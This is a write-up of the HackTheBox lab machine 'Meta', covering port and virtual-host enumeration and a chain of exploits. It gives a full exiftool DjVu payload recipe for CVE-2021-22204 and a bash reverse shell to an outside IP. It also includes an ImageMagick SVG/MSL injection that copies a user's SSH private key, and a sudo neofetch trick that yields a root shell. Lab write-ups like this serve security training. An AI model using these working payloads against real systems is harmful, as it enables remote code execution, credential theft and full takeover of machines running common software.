---
description: Meta box from HackTheBox write up.
---

# Meta

## Nmap scan

As usual let's launch a full port basic Nmap scan and then a more detailed one but only on open ports:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Meta]
└─$ sudo nmap -p- --min-rate 1000 10.10.11.140
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 04:16 EDT
Nmap scan report for 10.10.11.140
Host is up (0.054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 25.45 seconds
```

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Meta]
└─$ sudo nmap -p22,80 -sC -sV 10.10.11.140               
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 04:18 EDT
Nmap scan report for 10.10.11.140
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://artcorp.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.97 seconds
```

Just port 22 and 80 openned so let's start with the web server.

## Artcorp Webpage

### Initial Enumeration
First thing, the page is redirecting to `http://artcorp.htb/` to added the domain to my `/etc/hosts` file in order to access.

Since the page looks pretty empty I launched a `Gobuster` directory scan to check for something useful:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Meta]
└─$ gobuster dir -u http://artcorp.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://artcorp.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html
[+] Timeout:                 10s
===============================================================
2022/05/29 04:24:38 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 4427]
/assets               (Status: 301) [Size: 234] [--> http://artcorp.htb/assets/]
/css                  (Status: 301) [Size: 231] [--> http://artcorp.htb/css/]   
                                                                              
===============================================================
2022/05/29 04:29:10 Finished
===============================================================
```

No luck there but what about virtual hosts?

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Meta]
└─$ gobuster vhost -u http://artcorp.htb/ -w ~/Wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://artcorp.htb/
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /home/kali/Wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/05/29 04:27:59 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev01.artcorp.htb (Status: 200) [Size: 247]
                                                  
===============================================================
2022/05/29 04:30:01 Finished
===============================================================
```

There you go, adding the discovered subdomain to `/etc/hosts` file we are welcomed with a simple page that allow us to test application under development. Only one available, MetaView, the one the main page was talking about so let's take a look.

### RCE

The application allow us to upload a file and the page will show the metada information of it. Trying to add metada to a JPG image I noticed that I could get XSS, not usefull but hey it is something:
```bash
exiftool -overwrite_original -artist="<h1>TEST</h1>" exploit.jpg
```

Also I tried to inject a PHP payload but looks like the application is filtering it out. I tried for a while and even though I was not able to bypass the filter I found something while I was crying: [https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/){:target="_blank"}.

The page output looks really like `exiftool` being used to get the metada information so, maybe this RCE exploit could work. I replicated the PoC and generated a malicious image `exploit.jpg`:
```bash
# Payload file
(metadata "\c${system('id')};")

# Compress the payload and create a DjVu image
bzz payload payload.bzz
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz


#Create this configfile file for exiftool
%Image::ExifTool::UserDefined = (
    # All EXIF tags are added to the Main table, and WriteGroup is used to
    # specify where the tag is written (default is ExifIFD if not specified):
    'Image::ExifTool::Exif::Main' => {
        # Example 1.  EXIF:NewEXIFTag
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'string',
            WriteGroup => 'IFD0',
        },
        # add more user-defined EXIF tags here...
    },
);
1; #end%

# Using the configfile, inject the DjVu inside a JPG
exiftool -config configfile '-HasselbladExif<=exploit.djvu' -overwrite_original exploit.jpg
```

Uploading that file to the application will result in the `id` command being executed so we have RCE! We can now leverage this to get a reverse shell:

```bash
(metadata "\c${system('bash', '-c', 'bash -i >& /dev/tcp/10.10.14.12/8080 0>&1')};")
```

## In the machine as www-data

Using Pspy64 I saw that there are some funny things going on here:

```bash
2022/05/29 08:08:01 CMD: UID=0    PID=15560  | /bin/sh -c rm /tmp/* 
2022/05/29 08:08:01 CMD: UID=0    PID=15564  | /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf 
2022/05/29 08:08:01 CMD: UID=1000 PID=15563  | /usr/local/bin/mogrify -format png *.* 
2022/05/29 08:08:01 CMD: UID=1000 PID=15561  | /bin/bash /usr/local/bin/convert_images.sh 
2022/05/29 08:08:01 CMD: UID=1000 PID=15566  | pkill mogrify
```

Looks like the user 1000 (`thomas`), is running this script as a Cronjob:

```bash
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```

And also that the box love to delete things and move stuff around, this cost me some hours to be honest. Researchin about that `mogrify` thing I found [this](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html){:target="_blank"} blog about a vulnerability that can be used to inject commands using a malicious SVG file, this the one I used:

```xml
<image authenticate='ff" `echo $(cat /home/thomas/.ssh/id_rsa)> /home/thomas/0wned`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

At first I tested this trying to write the command output to the `/tmp` folder but thanks to the box cleaning up stuff I wasted a lot of time "debugging" something that was working. At the end I came up with the above payload and I was able to get the private key of the user, it needed some formatting but I got an SSH session with it at the end.

## In the machine as thomas

First of all, get the user flag under `/home/thomas/user.txt`.

```bash
2022/05/29 08:08:01 CMD: UID=0    PID=15564  | /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf 
```

Then I found something interesting:

```bash
thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```

Looks like this user is able to execute the `neofetch` command as `root`. According with the research I made, we can use this to get a shell as `root` using a configuration file with this content:

```bash
exec /bin/sh
```

The problem is that we can't specify a custom configuration file in the command but we can use the `XDG_CONFIG_HOME` environment variable. According to the documentation, Neofetch will use the file under `$XDG_CONFIG_HOME/neofetch/config.conf` and `sudo` is also configured to keep the `XDG_CONFIG_HOME` variable if present. 

With that information, I created `/home/thomas/neofetch/config.conf` and got a `root` shell:

```bash
thomas@meta:~$ cat neofetch/config.conf 
exec /bin/sh
thomas@meta:~$ sudo XDG_CONFIG_HOME=$HOME /usr/bin/neofetch 
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

The `root` flag is under `/root/root.txt`.
